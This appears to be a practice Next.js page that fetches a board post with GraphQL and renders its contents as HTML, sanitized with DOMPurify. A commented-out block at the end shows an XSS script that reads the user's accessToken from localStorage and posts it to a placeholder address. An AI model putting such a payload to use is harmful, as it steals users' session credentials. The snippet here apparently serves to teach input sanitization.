import { useQuery, gql } from '@apollo/client'
import { useRouter } from 'next/router'
import Dompurify from 'dompurify'

const FETCH_BOARD = gql`
    query fetchBoard($boardId: ID!){
        fetchBoard(boardId: $boardId) {
          _id
          writer
          title
          contents
        }
  }
`;

export default function StaticRoutingMovedPage(): JSX.Element {
    const router = useRouter()
    console.log(router.query.qqq)
    const { data } = useQuery(FETCH_BOARD, {
        variables: {
            boardId: router.query.qqq
        },
    });

    // console.log(data)

    return(
        <div>
            <div>작성자 : {data?.fetchBoard?.writer}</div>
            <div>제목 : {data?.fetchBoard?.title}</div>
            <div>내용 : {data?.fetchBoard?.contents}</div>
            {typeof window !== "undefined" && <div dangerouslySetInnerHTML={{
                __html: Dompurify.sanitize(data?.fetchBoard?.contents)
            }} />}
            {/* <div dangerouslySetInnerHTML={{
                __html: 
                    <script>
                        const qqq = localStorage.getItem("accessToken")
                        axios.post("내주소", {data : qqq})
                        console.log("qqq")
                    </script>
            }} /> */}
        </div>
    )
}